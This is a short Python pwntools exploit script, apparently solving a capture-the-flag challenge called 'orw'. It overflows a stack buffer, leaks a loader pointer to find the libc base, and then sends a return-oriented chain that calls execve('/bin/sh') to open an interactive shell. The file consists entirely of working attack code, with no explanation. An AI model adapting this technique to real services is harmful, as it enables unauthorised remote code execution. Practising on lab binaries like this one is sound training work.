from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF("orw")
libc = ELF("libc.so.6")
HOST = 'localhost'
PORT = 11337

if args.REMOTE:
    p = remote(HOST, PORT)
elif args.GDB:
    p = elf.process()
    gdb.attach(p)

bss = 0x404100
set_write = 0x401171

p.sendafter(b": ", cyclic(0x20) + p64(bss) + p64(set_write))
p.recvuntil(cyclic(0x20))

dump = p.recvrepeat(timeout=0.1)
leak = [unpack(dump[i:i+8],'all') for i in range(0,len(dump),8)][-1]   # _rtld_global
libc.address = leak - 0x24a000
info(f"libc base: {hex(libc.address)}")

pop_rdi = next(libc.search(asm("pop rdi; ret")))
pop_rsi = next(libc.search(asm("pop rsi; ret")))
pop_rdbx = next(libc.search(asm("pop rdx; pop rbx; ret")))
binsh = next(libc.search(b"/bin/sh"))

p.send(
    cyclic(0x28) + 
    p64(pop_rdi) + p64(binsh) + 
    p64(pop_rsi) + p64(0) + 
    p64(pop_rdbx) + p64(0) + p64(0) + 
    p64(libc.symbols["execve"])
)

p.interactive()
